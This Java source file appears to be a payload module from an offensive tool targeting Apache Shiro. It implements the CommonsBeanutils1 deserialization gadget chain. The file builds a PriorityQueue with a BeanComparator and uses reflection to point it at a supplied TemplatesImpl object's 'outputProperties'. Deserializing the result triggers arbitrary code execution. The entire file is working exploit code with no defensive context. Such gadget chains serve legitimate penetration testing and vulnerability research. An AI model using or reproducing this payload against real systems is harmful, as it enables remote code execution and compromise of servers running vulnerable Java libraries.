package com.liev.clouds.payload.shiro;


import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils1 implements ObjectPayload {
    @Override
    public Object getObject(Object templates) throws Exception {

        BeanComparator beanComparator = new BeanComparator("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        ReflectionsUtils.setFieldValue(beanComparator, "property", "outputProperties");


        Object[] queueArray = (Object[])ReflectionsUtils.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}



